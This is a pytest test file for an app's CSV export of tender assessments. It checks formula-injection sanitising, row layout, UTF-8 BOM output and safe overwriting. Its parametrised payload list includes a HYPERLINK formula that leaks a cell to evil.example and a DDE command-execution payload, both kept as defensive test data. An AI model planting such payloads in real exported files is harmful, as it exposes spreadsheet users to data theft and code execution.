"""Tests for CSV export and CSV/formula-injection protection."""

import csv
import io
from datetime import UTC, datetime

import pytest

from app.output_manager import (
    CSV_COLUMNS,
    assessments_to_csv_string,
    export_assessments_to_csv,
    sanitize_csv_field,
)
from app.schemas import DecisionStatus, EvidenceRef, GateResult, OpportunityAssessment, Requirement

EVALUATED_AT = datetime(2026, 11, 8, 12, 0, tzinfo=UTC)


def _assessment(title: str = "Road maintenance", requirements=None, **overrides) -> OpportunityAssessment:
    if requirements is None:
        requirements = [
            Requirement(
                requirement_id="R1",
                description="ISO 9001 certification",
                gate_result=GateResult.PASS,
                confidence=0.9,
                evidence=[EvidenceRef(document_id="tender.pdf", page=4, section="3.1")],
            )
        ]
    return OpportunityAssessment(
        opportunity_id="T-1",
        title=title,
        requirements=requirements,
        decision_status=DecisionStatus.ELIGIBLE_FOR_SCORING,
        decision_reasons=["ok"],
        evaluated_at=EVALUATED_AT,
        **overrides,
    )


def _parse(text: str) -> list[dict]:
    return list(csv.DictReader(io.StringIO(text)))


class TestSanitizeCsvField:
    @pytest.mark.parametrize(
        "payload",
        [
            "=1+1",
            "+1+1",
            "-1+1",
            "@SUM(A1)",
            "\t=1+1",
            "\r=1+1",
            '=HYPERLINK("http://evil.example/?"&A1,"click")',
            "=cmd|' /C calc'!A0",
        ],
    )
    def test_formula_triggers_are_prefixed(self, payload):
        assert sanitize_csv_field(payload) == "'" + payload

    @pytest.mark.parametrize("value", ["hello", "ISO 9001", "a=b", "1-2", " =not leading", ""])
    def test_safe_text_unchanged(self, value):
        assert sanitize_csv_field(value) == value

    def test_none_becomes_empty_string(self):
        assert sanitize_csv_field(None) == ""

    @pytest.mark.parametrize("value", [-5, 0, 3.14, -0.5, True, False])
    def test_numbers_and_bools_pass_through(self, value):
        assert sanitize_csv_field(value) == value

    def test_negative_number_as_string_is_sanitised(self):
        # Strings are untrusted regardless of looking numeric.
        assert sanitize_csv_field("-5") == "'-5"

    def test_non_string_objects_are_stringified(self):
        assert sanitize_csv_field(GateResult.PASS.value) == "pass"


class TestCsvString:
    def test_header_matches_columns(self):
        header = assessments_to_csv_string([_assessment()]).splitlines()[0]
        assert header.split(",") == CSV_COLUMNS

    def test_one_row_per_requirement(self):
        reqs = [
            Requirement(requirement_id=f"R{i}", description="d", gate_result=GateResult.PASS, confidence=0.9)
            for i in range(3)
        ]
        rows = _parse(assessments_to_csv_string([_assessment(requirements=reqs)]))
        assert [r["requirement_id"] for r in rows] == ["R0", "R1", "R2"]
        assert all(r["opportunity_id"] == "T-1" for r in rows)

    def test_assessment_without_requirements_still_exported(self):
        rows = _parse(assessments_to_csv_string([_assessment(requirements=[])]))
        assert len(rows) == 1
        assert rows[0]["decision_status"] == "eligible_for_scoring"
        assert rows[0]["requirement_id"] == ""

    def test_injection_in_title_is_neutralised(self):
        rows = _parse(assessments_to_csv_string([_assessment(title="=HYPERLINK(\"x\")")]))
        assert rows[0]["title"] == "'=HYPERLINK(\"x\")"

    def test_injection_in_nested_fields_is_neutralised(self):
        req = Requirement(
            requirement_id="R1",
            description="@SUM(A1)",
            notes="+cmd",
            gate_result=GateResult.FAIL,
            confidence=0.9,
            evidence=[EvidenceRef(document_id="=evil.pdf")],
        )
        row = _parse(assessments_to_csv_string([_assessment(requirements=[req])]))[0]
        assert row["requirement_description"] == "'@SUM(A1)"
        assert row["notes"] == "'+cmd"
        assert row["evidence"].startswith("'=")

    def test_commas_quotes_and_newlines_round_trip(self):
        title = 'Supply, install "and" maintain\nphase 2'
        rows = _parse(assessments_to_csv_string([_assessment(title=title)]))
        assert rows[0]["title"] == title

    def test_evidence_is_formatted(self):
        row = _parse(assessments_to_csv_string([_assessment()]))[0]
        assert row["evidence"] == "tender.pdf p.4 §3.1"

    def test_empty_input_gives_header_only(self):
        assert assessments_to_csv_string([]).strip() == ",".join(CSV_COLUMNS)


class TestExportToFile:
    def test_writes_file_and_creates_parent_dirs(self, tmp_path):
        target = tmp_path / "nested" / "dir" / "out.csv"
        result = export_assessments_to_csv([_assessment(title="=bad")], target)
        assert result == target.resolve()
        with open(result, encoding="utf-8-sig", newline="") as fh:
            rows = list(csv.DictReader(fh))
        assert rows[0]["title"] == "'=bad"

    def test_file_has_utf8_bom_for_excel(self, tmp_path):
        target = export_assessments_to_csv([_assessment(title="Café Zürich")], tmp_path / "out.csv")
        raw = target.read_bytes()
        assert raw.startswith(b"\xef\xbb\xbf")
        assert "Café Zürich" in raw.decode("utf-8-sig")

    def test_overwrites_existing_file(self, tmp_path):
        target = tmp_path / "out.csv"
        target.write_text("old content")
        export_assessments_to_csv([_assessment()], target)
        assert "old content" not in target.read_text(encoding="utf-8-sig")

    def test_no_temp_files_left_behind(self, tmp_path):
        export_assessments_to_csv([_assessment()], tmp_path / "out.csv")
        assert [p.name for p in tmp_path.iterdir()] == ["out.csv"]

    def test_failure_preserves_existing_file_and_cleans_temp(self, tmp_path, monkeypatch):
        target = tmp_path / "out.csv"
        target.write_text("previous good export")

        def boom(*_args, **_kwargs):
            raise RuntimeError("disk error")

        monkeypatch.setattr("app.output_manager._write_rows", boom)
        with pytest.raises(RuntimeError, match="disk error"):
            export_assessments_to_csv([_assessment()], target)

        assert target.read_text() == "previous good export"
        assert [p.name for p in tmp_path.iterdir()] == ["out.csv"]
